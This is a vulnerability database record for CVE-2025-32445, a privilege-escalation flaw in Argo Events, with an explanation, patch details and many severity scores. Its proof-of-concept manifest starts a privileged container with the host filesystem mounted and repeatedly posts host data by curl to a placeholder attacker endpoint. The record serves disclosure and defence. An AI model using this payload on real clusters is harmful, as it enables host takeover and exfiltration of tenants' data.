vulnerability_id: VCID-1vwj-4r1r-7fav
aliases:
  - CVE-2025-32445
  - GHSA-hmp7-x699-cvhq
summary: |
  Argo Events users can gain privileged access to the host system and cluster with EventSource and Sensor CR
  ### Summary:

  A user with permission to create/modify EventSource and Sensor custom resources can gain privileged access to the host system and cluster, even without having direct administrative privileges.

  ### Details:

  The `EventSource` and `Sensor` CRs allow the corresponding orchestrated pod to be customized with `spec.template` and `spec.template.container` (with type `k8s.io/api/core/v1.Container`), thus, any specification under `container` such as `command`, `args`, `securityContext `, `volumeMount` can be specified, and applied to the EventSource or Sensor pod due to the code logic below.

  ```golang
      if args.EventSource.Spec.Template != nil && args.EventSource.Spec.Template.Container != nil {
          if err := mergo.Merge(&eventSourceContainer, args.EventSource.Spec.Template.Container, mergo.WithOverride); err != nil {
              return nil, err
          }
      }
  ```

  With these, A user would be able to gain privileged access to the cluster host, if he/she specified the EventSource/Sensor CR with some particular properties under `template`.

  Here is an example that demonstrates the vulnerability.

  ```
  apiVersion: argoproj.io/v1alpha1
  kind: EventSource
  metadata:
    name: poc-vulnerable-eventsource
  spec:
    webhook:
      security-test:
        port: "12000"
        endpoint: "/webhook"
    template:
      container:
        image: ubuntu:latest
        command: ["/bin/bash"]
        args: [
          "-c",
          "apt-get update && apt-get install -y curl && while true; do
           rm -f /tmp/data;
           echo '=== containerd socket ===' > /tmp/data 2>&1;
           ls -la /host/run/containerd/containerd.sock >> /tmp/data 2>&1;
           echo '=== proof of host access ===' >> /tmp/data 2>&1;
           cat /host/etc/hostname >> /tmp/data 2>&1;
           curl -X POST --data-binary @/tmp/data http://<attacker-controlled-endpoint>:8000/;
           sleep 300;
           done"
        ]
        securityContext:
          privileged: true
          capabilities:
            add: ["SYS_ADMIN"]
        volumeMounts:
          - name: host-root
            mountPath: /host
      volumes:
        - name: host-root
          hostPath:
            path: /
  ```

  ### Impact:

  - Multi-tenant Clusters:
    - Tenant isolation broken
    - Non-admin users can gain host/cluster access
    - Access to other tenants' data

  - Security Model Bypass:
    - RBAC restrictions circumvented
    - Pod Security Policies/Standards bypassed
    - Host system compromised

  ### Patches

  A [patch](https://github.com/argoproj/argo-events/pull/3528) for this vulnerability has been released in the following Argo Events version , which only limited properties under `spec.template.container` are allowed.

  `v1.9.6`

  ### Credits

  This vulnerability was found & reported by:

  @thevilledev

  The Argo team would like to thank him for his responsible disclosure and constructive communications during the resolve of this issue.
severities:
  - score: '9.9'
    scoring_system: cvssv3
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H
    published_at: None
    url: https://access.redhat.com/hydra/rest/securitydata/cve/CVE-2025-32445.json
  - score: '0.00042'
    scoring_system: epss
    scoring_elements: '0.12341'
    published_at: '2025-04-16 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-32445
  - score: '0.00042'
    scoring_system: epss
    scoring_elements: '0.12491'
    published_at: '2025-04-20 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-32445
  - score: '0.00042'
    scoring_system: epss
    scoring_elements: '0.12518'
    published_at: '2025-04-19 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-32445
  - score: '0.00042'
    scoring_system: epss
    scoring_elements: '0.12513'
    published_at: '2025-04-18 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-32445
  - score: '0.00042'
    scoring_system: epss
    scoring_elements: '0.12441'
    published_at: '2025-04-17 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-32445
  - score: '0.00047'
    scoring_system: epss
    scoring_elements: '0.14443'
    published_at: '2025-04-28 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-32445
  - score: '0.00047'
    scoring_system: epss
    scoring_elements: '0.14467'
    published_at: '2025-04-21 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-32445
  - score: '0.00047'
    scoring_system: epss
    scoring_elements: '0.14457'
    published_at: '2025-04-22 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-32445
  - score: '0.00047'
    scoring_system: epss
    scoring_elements: '0.14441'
    published_at: '2025-04-23 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-32445
  - score: '0.00047'
    scoring_system: epss
    scoring_elements: '0.1445'
    published_at: '2025-04-24 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-32445
  - score: '0.00047'
    scoring_system: epss
    scoring_elements: '0.14473'
    published_at: '2025-04-25 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-32445
  - score: '0.00047'
    scoring_system: epss
    scoring_elements: '0.14475'
    published_at: '2025-04-26 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-32445
  - score: '0.00047'
    scoring_system: epss
    scoring_elements: '0.14464'
    published_at: '2025-04-27 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-32445
  - score: '9.9'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H
    published_at: None
    url: https://github.com/argoproj/argo-events
  - score: CRITICAL
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://github.com/argoproj/argo-events
  - score: 10
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H
    published_at: None
    url: https://github.com/argoproj/argo-events/commit/18412293a699f559848b00e6e459c9ce2de0d3e2
  - score: '9.9'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H
    published_at: None
    url: https://github.com/argoproj/argo-events/commit/18412293a699f559848b00e6e459c9ce2de0d3e2
  - score: CRITICAL
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://github.com/argoproj/argo-events/commit/18412293a699f559848b00e6e459c9ce2de0d3e2
  - score: Track
    scoring_system: ssvc
    scoring_elements: SSVCv2/E:N/A:N/T:T/P:M/B:A/M:M/D:T/2025-04-15T20:06:43Z/
    published_at: None
    url: https://github.com/argoproj/argo-events/commit/18412293a699f559848b00e6e459c9ce2de0d3e2
  - score: '9.9'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H
    published_at: None
    url: https://github.com/argoproj/argo-events/pull/3528
  - score: CRITICAL
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://github.com/argoproj/argo-events/pull/3528
  - score: 10
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H
    published_at: None
    url: https://github.com/argoproj/argo-events/security/advisories/GHSA-hmp7-x699-cvhq
  - score: '9.9'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H
    published_at: None
    url: https://github.com/argoproj/argo-events/security/advisories/GHSA-hmp7-x699-cvhq
  - score: CRITICAL
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://github.com/argoproj/argo-events/security/advisories/GHSA-hmp7-x699-cvhq
  - score: Track
    scoring_system: ssvc
    scoring_elements: SSVCv2/E:N/A:N/T:T/P:M/B:A/M:M/D:T/2025-04-15T20:06:43Z/
    published_at: None
    url: https://github.com/argoproj/argo-events/security/advisories/GHSA-hmp7-x699-cvhq
  - score: '9.9'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H
    published_at: None
    url: https://nvd.nist.gov/vuln/detail/CVE-2025-32445
  - score: CRITICAL
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://nvd.nist.gov/vuln/detail/CVE-2025-32445
  - score: '9.9'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H
    published_at: None
    url: https://pkg.go.dev/vuln/GO-2025-3608
  - score: CRITICAL
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://pkg.go.dev/vuln/GO-2025-3608
weaknesses:
  - CWE-268
  - CWE-250
references:
  - url: https://access.redhat.com/hydra/rest/securitydata/cve/CVE-2025-32445.json
    reference_type:
    reference_id:
  - url: https://api.first.org/data/v1/epss?cve=CVE-2025-32445
    reference_type:
    reference_id:
  - url: https://github.com/argoproj/argo-events
    reference_type:
    reference_id:
  - url: https://github.com/argoproj/argo-events/commit/18412293a699f559848b00e6e459c9ce2de0d3e2
    reference_type:
    reference_id:
  - url: https://github.com/argoproj/argo-events/pull/3528
    reference_type:
    reference_id:
  - url: https://github.com/argoproj/argo-events/security/advisories/GHSA-hmp7-x699-cvhq
    reference_type:
    reference_id:
  - url: https://nvd.nist.gov/vuln/detail/CVE-2025-32445
    reference_type:
    reference_id:
  - url: https://pkg.go.dev/vuln/GO-2025-3608
    reference_type:
    reference_id:
  - url: https://bugzilla.redhat.com/show_bug.cgi?id=2359572
    reference_type:
    reference_id: 2359572
